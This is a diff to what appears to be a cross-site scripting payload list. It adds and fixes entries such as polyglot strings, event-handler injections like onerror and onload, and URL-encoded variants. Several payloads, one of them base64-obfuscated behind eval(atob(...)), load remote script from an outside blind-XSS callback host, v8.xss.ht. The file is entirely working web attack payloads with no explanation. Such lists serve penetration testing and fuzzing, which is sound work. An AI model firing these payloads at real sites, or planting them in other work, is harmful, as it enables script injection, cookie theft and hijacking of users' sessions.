@@ -1,8 +1,16 @@
 <Svg%20One%20OnLoad=alert\(1\)\>
 '"<Svg%20One%20OnLoad=confirm\(1\)\>
+<svg/onload=alert()>
+<script/src=//⑮.rs
+<x/oncut=alert(1)>a
+<iframe src=//⑮.rs>
+'"<x/oncut=alert(1)>a
+"<script src=//14.rs>"
 onload=alert(document.domain)
 javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 "'><img src=x onerror=alert(1)>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 "><script src=https://v8.xss.ht></script>
 javascript:eval('var a=document.createElement(\'script\');a.src=\'https://v8.xss.ht\';document.body.appendChild(a)')
 "><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdjgueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>
@@ -13,6 +21,12 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://v8.xss
 <script>$.getScript("//v8.xss.ht")</script>
 "></script><script>alert(document.cookie)</script>
 "><image/src="//
+"><img src onerror=alert(1)>
+"autofocus onfocus=alert(1)//
+</script><script>alert(1)</script>
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
 #'><img src=x onerror=alert(document.domain)>
 %22%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
 %22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document%2Ecookie%29%3C%2Fscript%3E
@@ -30,7 +44,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://v8.xss
 1234%3Cimg%2Bsrc%2Bonerror%253d%27alert%281%29%27%3E
 1234<img src onerror='alert(1)'>
 1234<img+src+onerror%3d'alert(1)'>
-</script><script>akert(1)</script>
+</script><script>alert(1)</script>
 </script><svg/onload=alert()>
 <script>alert(document.cookie)</script>
 FA%5FCERT%2527%2520onmouseover%3Dalert%281%29%2520%2527%2522%26
@@ -41,6 +55,3 @@ Test%20%3Cimg%20src%3Dx%20onerror%3Dalert%282%29%3E
 ayn%253C%2Fscript%253E%253Csvg%2Fonload%3Dalert%28document%252edomain%29%253E
 ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E
 ayn</script><svg/onload=alert(document.domain)>
-
-
-
